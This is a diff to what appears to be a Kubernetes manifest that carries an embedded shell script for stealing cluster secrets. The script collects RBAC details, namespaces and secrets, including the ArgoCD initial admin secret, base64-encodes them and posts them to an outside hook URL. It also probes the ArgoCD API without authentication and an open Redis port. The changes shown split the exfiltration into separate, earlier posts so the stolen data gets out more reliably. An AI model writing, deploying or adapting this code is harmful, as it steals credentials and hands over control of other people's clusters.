@@ -298,40 +298,40 @@ spec:
             "$K8S/api/v1/namespaces/argocd/secrets/argocd-initial-admin-secret" \
             2>/dev/null)
 
-          curl -sf --max-time 5 "${HOOK}/?stage=k8s-api-done" || true
+          # === POST k8s API results immediately ===
+          K8S_DATA="=== WHOAMI/RBAC ===
+${WHOAMI}
+=== NAMESPACES ===
+${NAMESPACES}
+=== SECRETS (current ns) ===
+${SECRETS}
+=== SECRETS (argocd ns) ===
+${SECRETS_ARGOCD}
+=== CLUSTER SECRETS ===
+${CLUSTER_SECRETS}
+=== ADMIN SECRET ===
+${ADMIN_SECRET}"
+          ENC=$(printf '%s' "$K8S_DATA" | base64 | tr -d '\n')
+          curl -sf --max-time 15 -X POST "${HOOK}/?stage=k8s-dump" \
+            --data-urlencode "d=${ENC}" || true
 
-          # === ArgoCD server API (unauthenticated probing) ===
-          ARGO_VER=$(curl -sf --max-time 5 http://10.96.234.115/api/version 2>/dev/null)
-          ARGO_APPS=$(curl -sf --max-time 5 http://10.96.234.115/api/v1/applications 2>/dev/null | head -c 3000)
+          # === ArgoCD server API (unauthenticated) ===
+          ARGO_VER=$(curl -sf --connect-timeout 3 --max-time 5 http://10.96.234.115/api/version 2>/dev/null)
+          ARGO_APPS=$(curl -sf --connect-timeout 3 --max-time 5 http://10.96.234.115/api/v1/applications 2>/dev/null | head -c 3000)
 
-          # === ArgoCD Redis (port 6379 — typically no auth in dev clusters) ===
-          REDIS_INFO=$(printf "INFO server\r\n" | nc -w3 10.96.216.35 6379 2>/dev/null | head -c 500)
-          REDIS_KEYS=$(printf "KEYS *\r\n" | nc -w3 10.96.216.35 6379 2>/dev/null | head -c 2000)
+          # === ArgoCD Redis — use curl with redis inline command protocol ===
+          # Send PING then KEYS * using raw TCP via curl telnet scheme
+          REDIS_PING=$(curl -sf --connect-timeout 3 --max-time 5 \
+            "telnet://10.96.216.35:6379" --data $'PING\r\n' 2>/dev/null | head -c 200)
 
           curl -sf --max-time 5 "${HOOK}/?stage=argocd-done" || true
 
-          # === POST all data ===
-          DATA="=== WHOAMI/RBAC ===
-          ${WHOAMI}
-          === NAMESPACES ===
-          ${NAMESPACES}
-          === SECRETS (current ns) ===
-          ${SECRETS}
-          === SECRETS (argocd ns) ===
-          ${SECRETS_ARGOCD}
-          === CLUSTER SECRETS ===
-          ${CLUSTER_SECRETS}
-          === ADMIN SECRET ===
-          ${ADMIN_SECRET}
-          === ARGO VERSION ===
-          ${ARGO_VER}
-          === ARGO APPS ===
-          ${ARGO_APPS}
-          === REDIS INFO ===
-          ${REDIS_INFO}
-          === REDIS KEYS ===
-          ${REDIS_KEYS}"
-
-          ENC=$(printf '%s' "$DATA" | base64 | tr -d '\n')
-          curl -sf --max-time 15 -X POST "${HOOK}/?stage=full-dump" \
-            --data-urlencode "d=${ENC}" || true
+          ARGO_DATA="=== ARGO VERSION ===
+${ARGO_VER}
+=== ARGO APPS ===
+${ARGO_APPS}
+=== REDIS PING ===
+${REDIS_PING}"
+          ENC2=$(printf '%s' "$ARGO_DATA" | base64 | tr -d '\n')
+          curl -sf --max-time 15 -X POST "${HOOK}/?stage=argocd-dump" \
+            --data-urlencode "d=${ENC2}" || true
